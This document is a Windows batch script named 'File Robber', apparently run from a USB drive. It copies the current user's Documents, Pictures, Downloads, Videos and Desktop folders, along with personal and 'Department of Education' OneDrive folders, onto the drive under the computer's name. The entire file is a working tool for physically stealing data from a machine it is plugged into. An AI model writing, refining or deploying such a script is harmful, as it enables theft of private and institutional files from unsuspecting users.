@echo off
setlocal

echo Gathering Computer Data...

REM Get the current directory of the batch script
set "scriptdir=%~dp0"

REM Get the computer name
for /F "tokens=2 delims==." %%a in ('wmic os get csname /value') do set "computername=%%a"

REM Create the folder name with computer name
set "outputfolder=output"

echo Setting up File Robber...

REM Check if the folder already exists, if not, create it
if not exist "%scriptdir%\%outputfolder%\%computername%" (
    md "%scriptdir%\%outputfolder%\%computername%"
)

REM List of source folders to copy from
set "folders=Documents Pictures Downloads Videos Desktop"

echo Starting File Robber...
cls
echo --------------------------------------------------------------------
echo --------------------------------------------------------------------
echo FILE ROBBER BETA V0.2
echo Created by @HighSchoolProgrammer on GitHub
echo https://github.com/HighSchoolProgrammer/USB-File-Robber
echo --------------------------------------------------------------------
echo --------------------------------------------------------------------

timeout /t 3 

REM Loop through each folder, copy files, and move them to the 'OUTPUT' folder
for %%d in (%folders%) do (
    echo Copying %%d...
    xcopy "%USERPROFILE%\%%d" "%scriptdir%\%outputfolder%\%computername%\%%d" /E /I /Y
    echo Completed copying %%d
)

echo All files copied to respective folders in the "%outputfolder%" folder in: %scriptdir%
echo Attempting to get OneDrive...

REM Get the OneDrive folder path using environment variables
set "onedrivepath=%USERPROFILE%\OneDrive"

echo Copying Personal OneDrive to USB...

REM Check if the OneDrive folder exists, then copy its contents
if exist "%onedrivepath%" (
    xcopy "%onedrivepath%" "%scriptdir%\%outputfolder%\%computername%\OneDrive" /E /I /Y
) else (
    echo Personal OneDrive folder not found.
)

echo Copying DOE OneDrive to USB...

REM Check if the OneDrive folder exists, then copy its contents
if exist "%onedrivepath% - Department of Education" (
    xcopy "%onedrivepath% - Department of Education" "%scriptdir%\%outputfolder%\%computername%\OneDrive - Department of Education" /E /I /Y
) else (
    echo DOE OneDrive folder not found.
)



echo Completed. The USB is safe to unplug. Press any key to close File Robber.
pause
